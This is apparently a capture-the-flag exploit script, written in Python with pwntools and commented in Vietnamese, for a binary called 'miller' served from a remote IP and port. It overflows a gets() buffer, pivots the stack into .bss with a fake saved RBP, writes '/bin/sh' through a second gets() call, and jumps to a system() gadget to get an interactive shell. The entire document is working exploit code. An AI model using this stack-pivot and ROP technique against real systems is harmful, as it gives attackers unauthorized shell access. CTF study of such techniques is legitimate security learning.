from pwn import *

p = remote('194.102.62.175', 24040)
# p = process('./miller')

# 1. Nhập size <= 256 để đi vào nhánh gọi gets()
p.sendlineafter(b"message", b"100")

# --- ĐỊA CHỈ GADGET ---
call_gets = 0x401450           # Gadget chuẩn bị rdi và gọi gets()
mov_rax_rdi_system = 0x401249  # Gadget gọi system()
bss_addr = 0x405800            # Vùng nhớ .bss an toàn, rỗng và có quyền Read/Write
fake_rbp = bss_addr + 0x110    # Tính toán rbp giả để gets() trỏ đúng vào bss_addr

# --- PAYLOAD 1: THỰC HIỆN STACK PIVOT ---
# Mục tiêu: Đổi rbp và ép chương trình chạy gets() lần thứ 2 tại vùng .bss
payload1 = b"A" * 272
payload1 += p64(fake_rbp)      # Ghi đè Saved RBP
payload1 += p64(call_gets)     # Ghi đè Saved RIP (Return Address)

p.sendlineafter(b"message", payload1)

# --- PAYLOAD 2: CHUẨN BỊ SHELL VÀ THỰC THI ---
# Ngay lúc này, chương trình đang chạy gets() lần 2 và ghi thẳng vào bss_addr
payload2 = b"/bin/sh\x00"
payload2 += b"A" * (272 - len(payload2))
payload2 += p64(0)                    # Saved RBP mới (không còn quan trọng)
payload2 += p64(mov_rax_rdi_system)   # Saved RIP mới -> Nhảy vào gọi system

# Gửi payload 2
p.sendline(payload2)

# Nhận Shell!
p.interactive()
